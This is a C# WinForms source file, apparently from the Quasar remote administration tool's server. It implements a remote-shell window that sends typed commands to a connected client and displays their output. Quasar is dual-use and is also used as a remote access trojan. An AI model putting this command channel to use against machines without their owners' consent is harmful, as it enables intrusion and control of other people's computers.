﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using Quasar.Common.Messages;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;

namespace Quasar.Server.Forms
{
    public partial class FrmRemoteShell : Form
    {
        /// <summary>
        /// 可用于远程shell的客户端。
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// 用于处理与客户端通信的消息处理器。
        /// </summary>
        public readonly RemoteShellHandler RemoteShellHandler;

        /// <summary>
        /// 为每个客户端保存已打开的远程shell表单。
        /// </summary>
        private static readonly Dictionary<Client, FrmRemoteShell> OpenedForms = new Dictionary<Client, FrmRemoteShell>();

        /// <summary>
        /// 为客户端创建新的远程shell表单，或者如果已存在则获取当前打开的表单。
        /// </summary>
        /// <param name="client">用于远程shell表单的客户端。</param>
        /// <returns>
        /// 如果当前没有打开的远程shell表单，则为客户端返回一个新的远程shell表单，否则创建一个新的。
        /// </returns>
        public static FrmRemoteShell CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmRemoteShell f = new FrmRemoteShell(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// 使用给定的客户端初始化 <see cref="FrmRemoteShell"/> 类的新实例。
        /// </summary>
        /// <param name="client">用于远程shell表单的客户端。</param>
        public FrmRemoteShell(Client client)
        {
            _connectClient = client;
            RemoteShellHandler = new RemoteShellHandler(client);

            RegisterMessageHandler();
            InitializeComponent();

            txtConsoleOutput.AppendText(">> Type 'exit' to close this session" + Environment.NewLine);
        }

        /// <summary>
        /// 注册远程shell消息处理器以进行客户端通信。
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            RemoteShellHandler.ProgressChanged += CommandOutput;
            RemoteShellHandler.CommandError += CommandError;
            MessageHandler.Register(RemoteShellHandler);
        }

        /// <summary>
        /// 注销远程shell消息处理器。
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(RemoteShellHandler);
            RemoteShellHandler.ProgressChanged -= CommandOutput;
            RemoteShellHandler.CommandError -= CommandError;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// 当远程shell写入stdout时调用。
        /// </summary>
        /// <param name="sender">引发事件的消息处理器。</param>
        /// <param name="output">要写入的输出。</param>
        private void CommandOutput(object sender, string output)
        {
            txtConsoleOutput.SelectionColor = Color.WhiteSmoke;
            txtConsoleOutput.AppendText(output);
        }

        /// <summary>
        /// 当远程shell写入stderr时调用。
        /// </summary>
        /// <param name="sender">引发事件的消息处理器。</param>
        /// <param name="output">要写入的错误输出。</param>
        private void CommandError(object sender, string output)
        {
            txtConsoleOutput.SelectionColor = Color.Red;
            txtConsoleOutput.AppendText(output);
        }

        /// <summary>
        /// 当客户端断开连接时调用。
        /// </summary>
        /// <param name="client">断开连接的客户端。</param>
        /// <param name="connected">如果客户端连接则为True，如果断开连接则为false</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void FrmRemoteShell_Load(object sender, EventArgs e)
        {
            this.DoubleBuffered = true;
            this.Text = WindowHelper.GetWindowTitle("Remote Shell", _connectClient);
        }

        private void FrmRemoteShell_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            if (_connectClient.Connected)
                RemoteShellHandler.SendCommand("exit");
        }

        private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            NativeMethodsHelper.ScrollToBottom(txtConsoleOutput.Handle);
        }

        private void txtConsoleInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(txtConsoleInput.Text.Trim()))
            {
                string input = txtConsoleInput.Text.TrimStart(' ', ' ').TrimEnd(' ', ' ');
                txtConsoleInput.Text = string.Empty;

                // Split based on the space key.
                string[] splitSpaceInput = input.Split(' ');
                // Split based on the null key.
                string[] splitNullInput = input.Split(' ');

                // We have an exit command.
                if (input == "exit" ||
                    ((splitSpaceInput.Length > 0) && splitSpaceInput[0] == "exit") ||
                    ((splitNullInput.Length > 0) && splitNullInput[0] == "exit"))
                {
                    this.Close();
                }
                else
                {
                    switch (input)
                    {
                        case "cls":
                            txtConsoleOutput.Text = string.Empty;
                            break;
                        default:
                            RemoteShellHandler.SendCommand(input);
                            break;
                    }
                }

                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void txtConsoleOutput_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar != (char) 2)
            {
                txtConsoleInput.Text += e.KeyChar.ToString();
                txtConsoleInput.Focus();
                txtConsoleInput.SelectionStart = txtConsoleOutput.TextLength;
                txtConsoleInput.ScrollToCaret();
            }
        }
    }
}